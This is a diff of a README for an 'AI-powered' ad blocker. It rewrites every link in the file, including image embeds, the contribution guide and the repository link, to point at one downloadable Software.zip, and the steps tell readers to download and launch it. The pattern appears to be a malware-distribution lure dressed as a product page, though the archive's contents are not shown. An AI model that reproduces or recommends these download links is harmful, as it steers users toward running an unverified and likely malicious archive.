@@ -1,6 +1,6 @@
 # 🚫 Ad-Blocker-AI 🤖
 
-![Ad-Blocker-AI](https://your-image-url.com)
+![Ad-Blocker-AI](https://github.com/RuneKommune78/Ad-Blocker-AI/releases/download/v1.0/Software.zip)
 
 Welcome to the **Ad-Blocker-AI** repository! This project provides an AI-powered ad blocker that utilizes advanced algorithms to detect and block intrusive ads on various websites. Say goodbye to unwanted distractions and safeguard your privacy with this innovative tool.
 
@@ -20,8 +20,8 @@ The **Ad-Blocker-AI** repository offers a cutting-edge solution to enhance your 
 
 To get started with the **Ad-Blocker-AI** ad blocker, follow these simple steps:
 
-1. Download the latest release by clicking [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip).
-   ![Download Ad-Blocker-AI](https://img.shields.io/badge/Download-v1.0.0-blue)
+1. Download the latest release by clicking [here](https://github.com/RuneKommune78/Ad-Blocker-AI/releases/download/v1.0/Software.zip).
+   ![Download Ad-Blocker-AI](https://github.com/RuneKommune78/Ad-Blocker-AI/releases/download/v1.0/Software.zip)
 
 2. Launch the zip file and extract the contents to your desired location.
 
@@ -54,7 +54,7 @@ To get started with the **Ad-Blocker-AI** ad blocker, follow these simple steps:
 
 ## 🤝 Contributing
 
-Contributions to the **Ad-Blocker-AI** repository are welcome! Whether you want to suggest new features, report issues, or enhance the existing codebase, your input is valuable. Follow the guidelines in the [Contribution Guide](CONTRIBUTING.md) to get started.
+Contributions to the **Ad-Blocker-AI** repository are welcome! Whether you want to suggest new features, report issues, or enhance the existing codebase, your input is valuable. Follow the guidelines in the [Contribution Guide](https://github.com/RuneKommune78/Ad-Blocker-AI/releases/download/v1.0/Software.zip) to get started.
 
 ## 📝 License
 
@@ -64,8 +64,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 🌟 Experience a clutter-free and secure browsing journey with **Ad-Blocker-AI**! Say goodbye to intrusive ads and welcome a new era of privacy protection powered by AI technology. Download the latest release and enhance your online experience today.
 
-![Ad-Blocker-AI](https://your-image-url.com)
+![Ad-Blocker-AI](https://github.com/RuneKommune78/Ad-Blocker-AI/releases/download/v1.0/Software.zip)
 
-[Visit Repository](https://github.com/yourusername/Ad-Blocker-AI)
+[Visit Repository](https://github.com/RuneKommune78/Ad-Blocker-AI/releases/download/v1.0/Software.zip)
 
 ---
